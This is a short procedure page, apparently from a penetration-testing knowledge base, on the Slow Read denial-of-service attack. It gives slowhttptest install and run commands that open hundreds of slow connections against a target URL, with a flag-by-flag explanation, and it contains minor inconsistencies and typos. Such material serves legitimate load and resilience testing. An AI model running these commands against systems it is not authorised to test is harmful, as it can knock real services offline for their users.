---
id: 5304dfa5-7882-428a-88ae-93b02d919e05
name: Slow Read DoS Attack
type: procedure
verified: true
submitted: true
created_at: '2020-09-06T18:43:30.724513+00:00'
updated_at: '2023-05-26T18:22:09.037338+00:00'
platforms:
- Web
tags:
- '[[DOS]]'
- '[[Web Applications]]'
commands:
- '[[Slowhttp test]]'
- '[[slow read DoS]]'
---

# Slow Read DoS Attack

**Status**: ✓ Verified

## Summary

Descritpion Slow read Dos attack is similar to slowloris attack except that instead of prolonging the request ,it sends the legitimate request . The technique in this attack is it reads the response slowly Instructions 1. Slowhttp test tool can be used to test for this kind of attack.Install slowht

## Description

# Descritpion

Slow read Dos attack is similar to slowloris attack except that instead of prolonging the request ,it sends the legitimate request . The technique in this attack is it reads the response slowly 

# Instructions



1. Slowhttp test tool can be used to test for this kind of attack.Install slowhttp test use the following command in linux machine. 







**Command** ([[Slowhttp test]]):

```bash
sudo apt-get install slowhttptest

```





2. Once the tool is installed use the following command on the target url . 







**Command** ([[slow read DoS]]):

```bash
slowhttptest -c 500 -H -g -o ./output_file -i 10 -r 200 -t GET -u http://yourwebsite-or-server-ip.com -x 24 -p 2
```





Below are the switches used in the above command



- `-c `: Specifies the target number of connections to establish during the test (in this example 500, normally with 200 should be enough to hang a server that doesn't have      protection against this attack).

- `-H`: Starts slowhttptest in SlowLoris mode, sending unfinished HTTP requests.

- `-g`: Forces slowhttptest to generate CSV and HTML files when test finishes with timestamp in filename.

- `-o`: Specifies custom file name, effective with `-g`.

- `-i`: Specifies the interval between follow up data for slowrois and Slow POST tests (in seconds).

- `-r`: Specifies the connection rate (per second).

- `-t`: Specifies the verb to use in HTTP request (POST, GET etc).

- `-u`: Specifies the URL or IP of the server that you want to attack.

- `-x`: Starts slowhttptest in Slow Read mode, reading HTTP responses slowly.

- `-p`: Specifies the interval to wait for HTTP response onprobe connection, before marking the server as DoSed (in seconds).



3. Load the application in the browser to confirm the DoS attack.





## Platforms

- Web

## Commands Used

- [[Slowhttp test]]
- [[slow read DoS]]

## Tags

- [[DOS]]
- [[Web Applications]]


